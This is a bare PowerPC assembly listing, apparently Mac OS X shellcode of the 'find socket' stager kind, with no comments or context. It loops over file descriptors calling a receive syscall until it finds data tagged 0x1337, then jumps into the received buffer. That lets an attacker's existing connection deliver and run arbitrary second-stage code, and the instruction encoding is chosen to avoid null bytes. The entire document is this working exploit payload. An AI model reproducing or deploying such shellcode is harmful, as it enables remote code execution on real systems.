.globl _main
.text
_main:
	li 	r29, 0xfff
	mtctr 	r29

findsock:
	subi	r0, r29, 0xfff - 102
	mfctr	r3
	subi	r4, r1, 4104
	li 	r5, 4095
	xor.	r6, r6, r6
	.long   0x44ffff02
	xor.	r6, r6, r6
	mfctr	r30
	lhz	r28, -4104(r1)
	cmpwi	cr0, r28, 0x1337
	bdnzf	cr0+eq, findsock	

gotsock:
	subi	r4, r1, 4100
	mtctr	r4
	blectr	
	xor.	r6, r6, r6
	trap
